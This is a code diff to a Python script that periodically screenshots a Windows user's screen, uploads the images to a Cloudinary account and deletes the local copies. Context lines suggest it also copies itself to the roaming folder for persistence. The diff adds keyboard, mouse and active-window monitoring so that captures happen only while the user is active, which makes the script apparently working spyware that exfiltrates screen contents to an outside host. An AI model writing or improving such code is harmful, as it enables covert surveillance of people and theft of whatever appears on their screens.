@@ -3,8 +3,11 @@ import pyautogui
 from cloudinary import config
 from cloudinary.uploader import upload
 from datetime import datetime
+from mouse import get_position
 from os import path, getlogin, makedirs, remove, getenv
 from platform import node, system
+from pygetwindow import getActiveWindow
+from pynput import keyboard
 from socket import gethostbyname, gethostname
 from shutil import copyfile
 from sys import executable
@@ -36,6 +39,19 @@ OS_NAME = system()
 
 SAVE_PATH = f"C:/Users/{USER_NAME}/AppData/local/Temp"
 makedirs(SAVE_PATH, exist_ok=True)
+
+
+def on_press(_):
+    global keyboard_activity
+    keyboard_activity = True
+
+
+last_mouse_pos = (0, 0)
+last_active_window = None
+keyboard_activity = False
+
+keyboard_listener = keyboard.Listener(on_press=on_press)
+keyboard_listener.start()
 
 
 def copy_to_roaming():
@@ -82,8 +98,37 @@ def upload_to_cloudinary(filepath: str) -> None:
     remove(filepath)
 
 
+def user_is_active():
+    global last_mouse_pos, last_active_window, keyboard_activity
+
+    # Verificar movimiento del mouse
+    current_mouse_pos = get_position()
+    mouse_moved = current_mouse_pos != last_mouse_pos
+    last_mouse_pos = current_mouse_pos
+
+    # Verificar cambio de ventana activa
+    try:
+        current_window = getActiveWindow().title
+    except:
+        current_window = None
+
+    window_changed = current_window != last_active_window
+    last_active_window = current_window
+
+    # Verificar teclado
+    keyboard_used = keyboard_activity
+    keyboard_activity = False
+
+    return mouse_moved or window_changed or keyboard_used
+
+
 def take_screenshot() -> None:
     while True:
+        if not user_is_active():
+            print("[…] Usuario inactivo, no se toma screenshot.")
+            sleep(INTERVAL)
+            continue
+
         filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg"
         filepath = path.join(SAVE_PATH, filename)
 
@@ -92,8 +137,7 @@ def take_screenshot() -> None:
         screenshot.save(filepath, "JPEG", quality=70, optimize=True)
 
         upload_to_cloudinary(filepath)
-        print(f"Screenshot guardada: {filepath}")
-
+        print(f"[✔] Screenshot tomada por actividad: {filename}")
         sleep(INTERVAL)
 
 
